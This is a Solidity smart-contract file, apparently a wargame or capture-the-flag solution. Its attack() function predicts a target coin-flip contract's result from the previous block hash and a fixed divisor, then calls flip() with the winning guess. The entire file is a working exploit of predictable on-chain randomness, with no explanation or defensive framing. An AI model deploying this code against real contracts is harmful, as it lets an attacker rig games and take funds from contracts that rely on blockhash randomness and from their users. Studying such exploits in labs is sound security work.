// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

interface IntCoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinF {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    IntCoinFlip public target;

    constructor(address _target) {
        target = IntCoinFlip(_target);
    }

    function attack() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1;

        return target.flip(guess);
    }
}
